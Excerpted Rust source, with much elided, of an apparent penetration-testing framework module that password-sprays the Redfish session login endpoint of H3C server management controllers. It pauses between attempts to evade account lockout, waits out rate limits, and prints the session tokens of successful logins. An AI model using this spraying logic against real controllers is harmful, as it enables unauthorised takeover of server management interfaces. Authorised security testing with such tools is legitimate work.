...
fn display_banner() {
    ...
    crate::mprintln!(
        "{}",
        "║   POST /redfish/v1/SessionService/Sessions                   ║".red()
    );
    crate::mprintln!(
        "{}",
        "║   Lockout-aware: pauses after N attempts per account          ║".red()
    );
    crate::mprintln!(
        "{}",
...
pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
    ...
    let ordered_pairs: Vec<(String, String)> = if spray_mode {
        ...
        for (u, p) in &pairs {
            if seen_users.insert(u.clone()) {
                users.push(u.clone());
            }
            if seen_passwords.insert(p.clone()) {
    ...
    'outer: for (user, pass) in &ordered_pairs {
        ...
        match try_login(&client, &host, &path, user, pass).await {
            LoginResult::Success(token) => {
                crate::mprintln!(
                    "{}",
                    format!("[+] HIT: {}:{} -> X-Auth-Token={}", user, pass, token)
                        .green()
                        .bold()
                );
            ...
            LoginResult::RateLimited(wait_secs) => {
                crate::mprintln!(
                    "{}",
                    format!("[~] 429 rate-limited — waiting {}s ...", wait_secs).yellow()
                );
            ...
            LoginResult::Error(msg) => {
                if verbose {
                    crate::mprintln!(
                        "{}",
                        format!("[!] {}:{} — error: {}", user, pass, msg).red()
                    );
                }
            }
        }
...
crate::register_native_module!(
    ...
    "generic/h3c_redfish_session_spray",
    native
);
